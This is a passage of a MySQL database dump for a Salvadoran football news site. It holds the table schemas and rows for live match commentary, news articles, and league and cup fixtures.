  `tipo` enum('gol','gol_penal','gol_cabeza','gol_tiro_libre','asistencia','tarjeta_amarilla','tarjeta_roja','cambio','comentario','inicio','descanso','fin','penal') NOT NULL DEFAULT 'comentario',
  `descripcion` text NOT NULL,
  `equipo` varchar(150) DEFAULT NULL,
  `jugador_id` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_partido` (`partido_id`,`division`)
) ENGINE=InnoDB AUTO_INCREMENT=142 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `match_comments`
--

LOCK TABLES `match_comments` WRITE;
/*!40000 ALTER TABLE `match_comments` DISABLE KEYS */;
INSERT INTO `match_comments` VALUES
(14,76,'primera',90,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. Municipal Limeño 0 - 0 C.D. Águila.','C.D. Municipal Limeño',NULL,'2026-06-08 15:39:57'),
(16,77,'primera',15,'gol','⚽ ¡GOOOOOL! Oscar Rodríguez marca para Alianza F.C. en el minuto 15.','Alianza F.C.',138,'2026-06-08 15:42:14'),
(17,77,'primera',45,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 1-0.','Alianza F.C.',NULL,'2026-06-08 15:42:29'),
(18,77,'primera',0,'inicio','▶️ ¡Arranca el partido! Segunda parte en juego.','Alianza F.C.',NULL,'2026-06-08 15:43:03'),
(19,77,'primera',45,'comentario','Inicio de la segunda parte','Alianza F.C.',NULL,'2026-06-08 15:43:21'),
(20,77,'primera',65,'gol_cabeza','🤕 ¡Gol de CABEZA! William Canales conecta de manera impresionante. Minuto 0.','Alianza F.C.',131,'2026-06-08 15:43:46'),
(21,77,'primera',89,'fin','🏁 ¡Pitido final! Resultado definitivo: Alianza F.C. 2 - 0 Inter TECLA.','Alianza F.C.',NULL,'2026-06-08 15:43:52'),
(22,78,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-06-08 16:11:26'),
(23,78,'primera',9,'cambio','🔄 Cambio en C.D. FAS: Sale Kevin Carabantes, entra Jonathan Nolasco. Minuto 9.','C.D. FAS',230,'2026-06-08 16:21:19'),
(24,78,'primera',140,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 0-0.','',NULL,'2026-06-08 18:31:34'),
(25,78,'primera',45,'inicio','▶️ ¡Empieza la segunda parte!','',NULL,'2026-06-08 20:13:24'),
(26,78,'primera',138,'cambio','🔄 Cambio en C.D. FAS: Sale Jonathan Valle, entra Kevin Carabantes. Minuto 138.','C.D. FAS',216,'2026-06-08 21:46:28'),
(27,78,'primera',153,'tarjeta_amarilla','🟨 Tarjeta amarilla para Brayan Landaverde de L.A. Firpo. Minuto 153.','L.A. Firpo',109,'2026-06-08 22:02:19'),
(28,78,'primera',154,'tarjeta_roja','🟥 ¡Tarjeta ROJA! Brayan Landaverde queda expulsado. Minuto 154.','L.A. Firpo',109,'2026-06-08 22:02:48'),
(29,78,'primera',154,'cambio','🔄 Cambio en L.A. Firpo: Sale Lucas R., entra Marvin Aranda. Minuto 154.','L.A. Firpo',117,'2026-06-08 22:03:21'),
(30,78,'primera',182,'cambio','🔄 Cambio en L.A. Firpo: Sale Wilberth Hernández, entra Misael Erazo. Minuto 182. [SALE:98]','L.A. Firpo',99,'2026-06-08 22:30:29'),
(31,78,'primera',204,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. FAS 0 - 0 L.A. Firpo.','C.D. FAS',NULL,'2026-06-08 22:53:23'),
(32,74,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-08 20:17:15'),
(33,74,'primera',1,'cambio','🔄 Cambio en C.D. FAS: Sale José Guevara, entra Juan Vega. Minuto 1. [SALE:222]','C.D. FAS',224,'2026-07-08 20:18:34'),
(34,74,'primera',4,'gol','⚽ ¡GOOOOOL! Juan Vega marca para C.D. FAS en el minuto 4.','C.D. FAS',224,'2026-07-08 20:22:11'),
(35,74,'primera',5,'gol','⚽ ¡GOOOOOL! Yan Maciel marca para C.D. FAS en el minuto 5.','C.D. FAS',228,'2026-07-08 20:22:51'),
(36,74,'primera',92,'fin','🏁 ¡Pitido final! Resultado definitivo: Alianza F.C. 0 - 2 C.D. FAS.','Alianza F.C.',NULL,'2026-07-10 15:11:07'),
(37,74,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-10 15:25:16'),
(38,74,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-10 15:25:18'),
(39,74,'primera',90,'fin','🏁 ¡Pitido final! Resultado definitivo: Alianza F.C. 0 - 2 C.D. FAS.','Alianza F.C.',NULL,'2026-07-10 15:25:25'),
(40,79,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-15 14:27:33'),
(41,79,'primera',0,'cambio','🔄 Cambio en L.A. Firpo: Sale Misael Erazo, entra Wilberth Hernández. Minuto 0. [SALE:99]','L.A. Firpo',98,'2026-07-15 14:28:01'),
(42,79,'primera',1,'cambio','🔄 Cambio en L.A. Firpo: Sale Cristian Gil, entra Diego Ortez. Minuto 1. [SALE:119]','L.A. Firpo',116,'2026-07-15 14:29:13'),
(43,79,'primera',26,'gol','⚽ ¡GOOOOOL! Jugador marca para Alianza F.C..','Alianza F.C.',NULL,'2026-07-15 14:29:52'),
(44,79,'primera',45,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 1-0.','Alianza F.C.',NULL,'2026-07-15 14:30:07'),
(45,79,'primera',90,'fin','🏁 ¡Pitido final! Resultado definitivo: Alianza F.C. 1 - 0 L.A. Firpo.','Alianza F.C.',NULL,'2026-07-15 14:30:23'),
(53,1001,'femenina',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-24 22:11:45'),
(60,1001,'femenina',42,'gol','⚽ ¡GOOOOOL! Mayreni Amaya marca para C.D. Cacahuatique Femenino en el minuto 42.','C.D. Cacahuatique Femenino',NULL,'2026-07-25 01:59:46'),
(61,1001,'femenina',45,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 1-0.','C.D. Cacahuatique Femenino',NULL,'2026-07-25 02:00:00'),
(62,1001,'femenina',66,'gol','⚽ ¡GOOOOOL! Heisy Benítez marca para C.D. Cacahuatique Femenino en el minuto 66.','C.D. Cacahuatique Femenino',NULL,'2026-07-25 02:01:32'),
(63,1001,'femenina',90,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. Cacahuatique Femenino 2 - 0 A.D. Isidro Metapán Femenino.','C.D. Cacahuatique Femenino',NULL,'2026-07-25 02:02:06'),
(64,81,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-25 02:03:32'),
(65,81,'primera',13,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Municipal Limeño en el minuto 13.','C.D. Municipal Limeño',NULL,'2026-07-25 02:04:36'),
(66,81,'primera',45,'descanso','Min 45’| FINALIZÓ EL PRIMER TIEMPO EN SANTA ANA 🔥','C.D. Municipal Limeño',NULL,'2026-07-25 02:34:05'),
(67,81,'primera',66,'gol','66\' ¡GOOOOOOL DE FAS!\nNelson Bonilla','C.D. FAS',NULL,'2026-07-25 03:08:45'),
(68,81,'primera',77,'gol','77\' ¡GOOOOOOL DE FAS!','C.D. FAS',NULL,'2026-07-25 04:03:04'),
(70,81,'primera',97,'gol','90+7\' ¡QUE SUPER GOLAZO KEVIN!','C.D. FAS',NULL,'2026-07-25 04:04:19'),
(71,81,'primera',97,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. FAS 3 - 1 C.D. Municipal Limeño.','C.D. FAS',NULL,'2026-07-25 04:04:29'),
(72,84,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-25 21:08:13'),
(73,84,'primera',6,'gol','⚽ ¡GOOOOOL! JUAN SANCHEZ marca para C.D. Cacahuatique en el minuto 6.','C.D. Cacahuatique',NULL,'2026-07-25 21:14:38'),
(74,84,'primera',8,'comentario','Falta de cacahuatique y tiro libre cerca del área para Metapán','C.D. Cacahuatique',NULL,'2026-07-25 21:16:51'),
(75,84,'primera',17,'comentario','Peligro imponente de Metapán para encontrar el gol, pero Cacahuatique es mejor defensivamente','A.D. Isidro Metapán',NULL,'2026-07-25 21:26:43'),
(76,84,'primera',26,'comentario','Falda para pacheco cerca del área','A.D. Isidro Metapán',NULL,'2026-07-25 21:34:37'),
(77,84,'primera',27,'comentario','Minuto de hidratación','C.D. Cacahuatique',NULL,'2026-07-25 21:36:00'),
(78,84,'primera',29,'comentario','Se reanuda el partido','C.D. Cacahuatique',NULL,'2026-07-25 21:38:07'),
(79,84,'primera',31,'comentario','ATAJADON DEL ARQUERO DE CACAHUATIQUE','C.D. Cacahuatique',NULL,'2026-07-25 21:39:22'),
(80,84,'primera',35,'tarjeta_amarilla','🟨 Tarjeta amarilla para el jugador con el dorsal 3 de C.D. Cacahuatique. Minuto 34.','C.D. Cacahuatique',NULL,'2026-07-25 21:43:27'),
(81,84,'primera',39,'comentario','Otra falta de cacahuatique, metapan tiene otra oportunidad de anotar','C.D. Cacahuatique',NULL,'2026-07-25 21:47:34'),
(83,84,'primera',42,'comentario','GOL ANULADO POR MANO DE HABERKORN','C.D. Cacahuatique',NULL,'2026-07-25 21:51:11'),
(84,84,'primera',45,'comentario','+4 minutos de agregado','C.D. Cacahuatique',NULL,'2026-07-25 21:53:22'),
(86,86,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-25 21:54:56'),
(87,86,'primera',30,'comentario','30’ El encuentro entra en la pausa de hidratación. Momento para recuperar energías, recibir indicaciones y afrontar con intensidad el resto de la primera mitad. ✅','CD ATL.BALBOA',NULL,'2026-07-25 21:56:07'),
(88,86,'primera',42,'comentario','Keka Cruz continúa siendo una constante amenaza en el último tercio de la cancha. Su movilidad y desequilibrio siguen generando peligro sobre el área rival.','CD ATL.BALBOA',NULL,'2026-07-25 21:56:38'),
(89,84,'primera',49,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 1-0.','',NULL,'2026-07-25 21:57:16'),
(90,86,'primera',45,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 0-0.','CD ATL.BALBOA',NULL,'2026-07-25 22:01:47'),
(91,86,'primera',45,'inicio','▶️ ¡Arranca el segundo tiempo¡','CD ATL.BALBOA',NULL,'2026-07-25 22:10:39'),
(92,84,'primera',45,'inicio','▶️ ¡Empieza la segunda parte!','',NULL,'2026-07-25 22:13:27'),
(93,84,'primera',53,'gol','⚽ ¡GOOOOOL! HABERKORN marca para A.D. Isidro Metapán en el minuto 53.','A.D. Isidro Metapán',NULL,'2026-07-25 22:22:10'),
(94,84,'primera',62,'comentario','Isidro metapan dominando el partido','A.D. Isidro Metapán',NULL,'2026-07-25 22:30:29'),
(95,84,'primera',62,'comentario','Posible penal para metapán','A.D. Isidro Metapán',NULL,'2026-07-25 22:32:32'),
(96,84,'primera',66,'comentario','PENAL PARA METAPÁN','A.D. Isidro Metapán',NULL,'2026-07-25 22:34:30'),
(97,84,'primera',67,'gol_penal','🎯 ¡Gol de PENAL!  DOBLETE DE HABERKORN convierte desde el punto de penalti. Minuto 67.','A.D. Isidro Metapán',NULL,'2026-07-25 22:36:14'),
(98,84,'primera',77,'gol','⚽ ¡GOOOOOL! ANDERSON  marca para C.D. Cacahuatique en el minuto 76.','C.D. Cacahuatique',NULL,'2026-07-25 22:46:22'),
(99,84,'primera',78,'gol','⚽ ¡GOOOOOL! HABERKORN ANOTA TRIPLETE para A.D. Isidro Metapán en el minuto 78.','A.D. Isidro Metapán',NULL,'2026-07-25 22:47:11'),
(100,84,'primera',86,'tarjeta_amarilla','🟨 Tarjeta amarilla para WILLIAN de C.D. Cacahuatique. Minuto 86.','C.D. Cacahuatique',NULL,'2026-07-25 22:55:10'),
(101,84,'primera',89,'tarjeta_amarilla','🟨 Tarjeta amarilla para Nicolaz gomez de A.D. Isidro Metapán. Minuto 89.','A.D. Isidro Metapán',NULL,'2026-07-25 22:57:43'),
(102,84,'primera',89,'comentario','Tiro libre para cacahuatique','C.D. Cacahuatique',NULL,'2026-07-25 22:58:00'),
(103,84,'primera',90,'comentario','+10 minutos añadidos','C.D. Cacahuatique',NULL,'2026-07-25 22:58:42'),
(104,84,'primera',94,'gol','⚽ ¡GOOOOOL! para A.D. Isidro Metapán en el minuto 92.','A.D. Isidro Metapán',NULL,'2026-07-25 23:03:18'),
(105,84,'primera',97,'comentario','METAPÁN SE PIERDE UN MANO A MANO','A.D. Isidro Metapán',NULL,'2026-07-25 23:06:19'),
(106,84,'primera',100,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. Cacahuatique 2 - 4 A.D. Isidro Metapán.','C.D. Cacahuatique',NULL,'2026-07-25 23:08:40'),
(108,86,'primera',112,'fin','🏁 ¡Pitido final! Resultado definitivo: CD ATL.BALBOA 0 - 0 Inter Tecla.','CD ATL.BALBOA',NULL,'2026-07-25 23:16:10'),
(109,87,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-26 00:27:25'),
(111,87,'primera',45,'comentario','+1 minuto de añadido','CD Inca Aruba',NULL,'2026-07-26 00:50:51'),
(112,87,'primera',46,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 0-1.','Alianza F.C.',NULL,'2026-07-26 00:51:56'),
(114,87,'primera',44,'gol','⚽ ¡GOOOOOL! Noel Rivera marca para Alianza F.C. en el minuto 44.','Alianza F.C.',136,'2026-07-26 01:10:27'),
(115,87,'primera',45,'inicio','▶️ ¡Empieza la segunda parte!','',NULL,'2026-07-26 01:12:02'),
(116,87,'primera',46,'tarjeta_amarilla','🟨 Tarjeta amarilla para el dorsal 4 de CD Inca Aruba. Minuto 46.','CD Inca Aruba',NULL,'2026-07-26 01:13:35'),
(117,87,'primera',59,'comentario','PENAL PARA EL ARUBA','CD Inca Aruba',NULL,'2026-07-26 01:26:40'),
(118,87,'primera',61,'gol_penal','🎯 ¡Gol de PENAL! BRYAN PAZ convierte desde el punto de penalti. Minuto 61.','CD Inca Aruba',NULL,'2026-07-26 01:28:38'),
(119,87,'primera',84,'gol','⚽ ¡GOOOOOL! Gustavo Moura marca para Alianza F.C. en el minuto 85.','Alianza F.C.',142,'2026-07-26 01:52:22'),
(120,87,'primera',91,'comentario','PENAL PARA ALIANZAA','Alianza F.C.',NULL,'2026-07-26 01:59:25'),
(121,87,'primera',93,'gol','⚽ ¡GOOOOOL!  David Leon marca para Alianza F.C. en el minuto 92.','Alianza F.C.',NULL,'2026-07-26 02:00:54'),
(122,87,'primera',98,'tarjeta_roja','🟥 ¡Tarjeta ROJA! para cd Inca Aruba','CD Inca Aruba',NULL,'2026-07-26 02:05:48'),
(123,87,'primera',98,'fin','🏁 ¡Pitido final! Resultado definitivo: CD Inca Aruba 1 - 3 Alianza F.C..','CD Inca Aruba',NULL,'2026-07-26 02:05:51'),
(124,88,'primera',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-26 09:09:13'),
(125,88,'primera',0,'gol','⚽ ¡GOOOOOL! Santos Ortiz marca para C.D. Águila en el minuto 0.','C.D. Águila',159,'2026-07-26 09:09:21'),
(126,88,'primera',90,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. Águila 1 - 0 L.A. Firpo.','C.D. Águila',NULL,'2026-07-26 09:09:32'),
(127,6,'reservas',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-26 18:00:03'),
(128,7,'reservas',0,'inicio','▶️ ¡Arranca el partido! Primera parte en juego.','',NULL,'2026-07-26 18:12:08'),
(129,6,'reservas',16,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Águila Reservas en el minuto 16.','C.D. Águila Reservas',NULL,'2026-07-26 18:19:22'),
(130,7,'reservas',16,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Fuerte San Francisco Reservas en el minuto 16.','C.D. Fuerte San Francisco Reservas',NULL,'2026-07-26 18:19:34'),
(131,6,'reservas',38,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Águila Reservas en el minuto 38.','L.A. Firpo Reservas',NULL,'2026-07-26 18:42:03'),
(132,7,'reservas',49,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 1-0.','',NULL,'2026-07-26 18:52:28'),
(133,6,'reservas',50,'descanso','☕ Pitido final de la primera mitad. Descanso con el marcador 1-1.','',NULL,'2026-07-26 18:52:31'),
(134,7,'reservas',45,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Fuerte San Francisco Reservas en el minuto 45.','C.D. Fuerte San Francisco Reservas',NULL,'2026-07-26 18:52:50'),
(135,7,'reservas',45,'inicio','▶️ ¡Empieza la segunda parte!','',NULL,'2026-07-26 19:12:25'),
(136,6,'reservas',45,'inicio','▶️ ¡Empieza la segunda parte!','',NULL,'2026-07-26 19:12:27'),
(137,6,'reservas',65,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Águila Reservas en el minuto 65.','C.D. Águila Reservas',NULL,'2026-07-26 19:26:54'),
(138,7,'reservas',62,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Platense Reservas en el minuto 62.','C.D. Platense Reservas',NULL,'2026-07-26 19:27:04'),
(139,7,'reservas',79,'gol','⚽ ¡GOOOOOL! Jugador marca para C.D. Fuerte San Francisco Reservas en el minuto 79.','C.D. Fuerte San Francisco Reservas',NULL,'2026-07-26 19:43:42'),
(140,7,'reservas',95,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. Fuerte San Francisco Reservas 3 - 1 C.D. Platense Reservas.','C.D. Fuerte San Francisco Reservas',NULL,'2026-07-26 19:59:09'),
(141,6,'reservas',97,'fin','🏁 ¡Pitido final! Resultado definitivo: C.D. Águila Reservas 2 - 1 L.A. Firpo Reservas.','C.D. Águila Reservas',NULL,'2026-07-26 20:00:09');
/*!40000 ALTER TABLE `match_comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `noticias`
--

DROP TABLE IF EXISTS `noticias`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `noticias` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `titulo` varchar(255) NOT NULL,
  `contenido` text DEFAULT NULL,
  `categoria` varchar(100) DEFAULT NULL,
  `autor` varchar(100) DEFAULT NULL,
  `media` text DEFAULT NULL,
  `estado` enum('Publicado','Borrador') DEFAULT 'Publicado',
  `fecha` timestamp NULL DEFAULT current_timestamp(),
  `imagen` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `noticias`
--

LOCK TABLES `noticias` WRITE;
/*!40000 ALTER TABLE `noticias` DISABLE KEYS */;
INSERT INTO `noticias` VALUES
(13,'Nueva Liga de Ascenso en El Salvador #2026','Esta es la lista oficial de los equipos que participaran en la competiciones la liga de ascenso','Liga de Ascenso','Números y Fútbol',NULL,'Publicado','2026-07-24 13:32:53','http://numeros-y-futbol.test/backend/uploads/6a636984ef224.mp4'),
(14,'SOPORTE DE FVS EN EL SALVADOR!!!!','Football Video Support (FVS) presente la Liga GanaPlay gracias a la organización y trabajo de la Federación Salvadoreña de Fútbol.\nEl juego de inauguración entre CD FAS vs CD Mpal. Limeño contó con el apoyo del FVS (Football Video Support), con ello inicia una nueva etapa en la profesionalización y soporte tecnolóico para arbitraje salvadoreño.','Liga mayor','Números y Fútbol',NULL,'Publicado','2026-07-26 00:10:04','/backend/uploads/6a6550de59218.jpg'),
(15,'Último Momento El Salvador cae goleado 3-0 ante Cuba en el Premundial Sub-20','La selección sub-20 de El Salvador comenzó con el pie izquierdo su participación en el Campeonato Sub-20 de CONCACAF. La Azulita fue incapaz de convertir las numerosas oportunidades que generó y terminó goleada 3-0 por Cuba, un resultado que complica desde la primera jornada sus aspiraciones de avanzar en el clasificatorio mundialista.\n\nEl equipo salvadoreño dominó amplios pasajes del encuentro. Tuvo el 73 % de la posesión, pero volvió a evidenciar su principal problema: la falta de contundencia. Pese a acercarse en varias ocasiones al área rival, no encontró la fórmula para vencer al guardameta Y. Zayas, quien respondió cuando fue exigido.\n\nLa acción que mejor resumió la tarde de la Azulita llegó cuando Johann Ortiz tenía todo para abrir el marcador, pero el balón terminó impactando en su propio compañero, Jeferson Roque, en una jugada tan insólita como determinante para el desarrollo del partido.\n\nCuba, en cambio, hizo gala de una eficacia implacable. Los caribeños aprovecharon los espacios que dejó El Salvador y golpearon primero al minuto 36, cuando A. Águila definió para el 1-0 con el que se fueron al descanso.\n\nEn la segunda mitad, El Salvador mantuvo la iniciativa y buscó el descuento, pero volvió a encontrarse con un rival ordenado y efectivo en las transiciones. Los cubanos ampliaron la ventaja y, cuando el encuentro agonizaba, Rainiel Morales sentenció la goleada al minuto 88 con el definitivo 3-0.\n\nLa derrota deja a la selección salvadoreña en una posición comprometida desde el inicio del Premundial Sub-20. Más allá del dominio territorial y de la intención ofensiva, la falta de contundencia volvió a pasar factura ante un rival caribeño que aprovechó prácticamente cada oportunidad para llevarse un triunfo que puede resultar decisivo en la lucha por la clasificación. Los de Erick Dowson Prado lo tienen difícil.','Selección sub-20','Números y Fútbol',NULL,'Publicado','2026-07-26 07:02:52','/backend/uploads/6a65b11ca95a6.webp'),
(17,'𝗟𝗢𝗦 𝗚𝗢𝗟𝗔𝗭𝗢𝗦 que nos dejó la Jornada 1','La Jornada 1 de la #LigaGanaPlay arrancó con emociones de principio a fin, pero hubo tres anotaciones que se robaron todos los reflectores y dejaron claro que el campeonato comienza con un altísimo nivel de competencia.\n\nEl primer lugar de esta selección es para Kevin Santamaría, quien sorprendió con un auténtico golazo gracias a un potente remate que dejó sin opciones al guardameta y desató la celebración de la afición.\n\nEn la segunda posición aparece Brayan Paz, autor de una definición espectacular que combinó técnica, precisión y sangre fría para enviar el balón al fondo de la red, convirtiéndose en una de las mejores jugadas del inicio del torneo.\n\nCerrando el podio está Carlos Bogotá, quien también hizo vibrar a los aficionados con una gran anotación, demostrando calidad individual y un excelente golpeo de balón para completar el Top 3 de los mejores goles de la fecha.\n\nTres jugadores, tres golazos y un solo mensaje: la #LigaGanaPlay apenas comienza y ya nos está regalando momentos inolvidables.\n\n1️⃣ Kevin Santamaría\n2️⃣ Brayan Paz\n3️⃣ Carlos Bogotá','Liga mayor','Jose Felix Sinto Masin',NULL,'Publicado','2026-07-28 12:37:20','/backend/uploads/6a68a28098a67.mp4');
/*!40000 ALTER TABLE `noticias` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos`
--

DROP TABLE IF EXISTS `partidos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_local` int(11) DEFAULT NULL,
  `equipo_visitante` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT 0,
  `goles_visitante` int(11) DEFAULT 0,
  `jugado` tinyint(1) DEFAULT 0,
  `fecha` datetime DEFAULT NULL,
  `jornada` int(11) DEFAULT NULL,
  `estado` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=105 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos`
--

LOCK TABLES `partidos` WRITE;
/*!40000 ALTER TABLE `partidos` DISABLE KEYS */;
INSERT INTO `partidos` VALUES
(81,15,7,3,1,0,'2026-07-24 19:30:00',1,'Finalizado',0),
(84,10,9,2,4,0,'2026-07-25 15:00:00',1,'Finalizado',0),
(86,17,8,0,0,0,'2026-07-25 15:00:00',1,'Finalizado',0),
(87,18,5,1,3,0,'2026-07-25 18:00:00',1,'Finalizado',0),
(88,6,4,1,1,0,'2026-07-26 15:00:00',1,'Finalizado',0),
(89,12,11,1,1,0,'2026-07-26 15:00:00',1,'Finalizado',0),
(91,10,17,4,2,0,'2026-07-28 15:30:00',2,'Finalizado',0),
(92,7,18,2,0,0,'2026-07-29 17:00:00',2,'Finalizado',0),
(93,4,12,4,0,0,'2026-07-29 19:00:00',2,'Finalizado',0),
(94,9,15,2,0,0,'2026-07-30 18:00:00',2,'Finalizado',0),
(95,8,6,0,0,0,'2026-07-30 20:00:00',2,'Finalizado',0),
(96,11,5,0,0,0,'2026-08-26 15:00:00',2,'Pendiente',0),
(97,12,8,0,0,0,'2026-08-01 15:00:00',3,'Pendiente',0),
(98,7,11,NULL,NULL,0,'2026-08-01 17:00:00',3,'Pendiente',0),
(99,6,10,0,0,0,'2026-08-02 15:00:00',3,'Pendiente',0),
(100,17,9,0,0,0,'2026-08-02 15:00:00',3,'Pendiente',0),
(101,18,15,0,0,0,'2026-08-02 17:30:00',3,'Pendiente',0),
(102,4,5,0,0,0,'2026-09-16 19:00:00',3,'Pendiente',0),
(103,9,6,0,0,0,'2026-08-07 19:00:00',4,'Pendiente',0),
(104,11,18,0,0,0,'2026-08-08 15:00:00',4,'Pendiente',0);
/*!40000 ALTER TABLE `partidos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_ascenso`
--

DROP TABLE IF EXISTS `partidos_ascenso`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_ascenso` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `local_id` int(11) DEFAULT NULL,
  `visitante_id` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT NULL,
  `goles_visitante` int(11) DEFAULT NULL,
  `fecha` datetime DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `status` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_ascenso`
--

LOCK TABLES `partidos_ascenso` WRITE;
/*!40000 ALTER TABLE `partidos_ascenso` DISABLE KEYS */;
/*!40000 ALTER TABLE `partidos_ascenso` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_burgerking`
--

DROP TABLE IF EXISTS `partidos_burgerking`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_burgerking` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_local` int(11) DEFAULT NULL,
  `equipo_visitante` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT 0,
  `goles_visitante` int(11) DEFAULT 0,
  `fecha` datetime DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `jornada` int(11) DEFAULT NULL,
  `estado` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_burgerking`
--

LOCK TABLES `partidos_burgerking` WRITE;
/*!40000 ALTER TABLE `partidos_burgerking` DISABLE KEYS */;
INSERT INTO `partidos_burgerking` VALUES
(1,31,30,1,4,'2026-07-24 12:00:00',NULL,1,'Finalizado',0),
(3,27,25,2,2,'2026-07-25 13:00:00',NULL,1,'Finalizado',0),
(4,33,32,0,2,'2026-07-25 14:00:00',NULL,1,'Finalizado',0),
(5,36,26,0,6,'2026-07-25 15:00:00',NULL,1,'Finalizado',0),
(6,35,29,0,4,'2026-07-26 11:00:00',NULL,1,'Finalizado',0),
(7,34,28,1,1,'2026-07-26 11:00:00',NULL,1,'Finalizado',0),
(8,28,36,0,0,'2026-07-28 12:00:00',NULL,2,'Pendiente',0),
(9,25,33,0,0,'2026-07-28 13:30:00',NULL,2,'Pendiente',0),
(10,31,35,0,0,'2026-07-29 15:00:00',NULL,2,'Pendiente',0),
(11,30,34,0,0,'2026-07-29 13:00:00',NULL,2,'Pendiente',0),
(12,29,27,0,0,'2026-07-29 14:00:00',NULL,2,'Pendiente',0),
(13,32,26,0,0,'2026-07-30 12:30:00',NULL,2,'Pendiente',0);
/*!40000 ALTER TABLE `partidos_burgerking` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_copa`
--

DROP TABLE IF EXISTS `partidos_copa`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_copa` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_local_id` int(11) NOT NULL COMMENT 'ID en equipos_copa',
  `equipo_visitante_id` int(11) NOT NULL COMMENT 'ID en equipos_copa',
  `goles_local` int(11) DEFAULT NULL,
  `goles_visitante` int(11) DEFAULT NULL,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `estado` enum('Pendiente','En Curso','Finalizado') DEFAULT 'Pendiente',
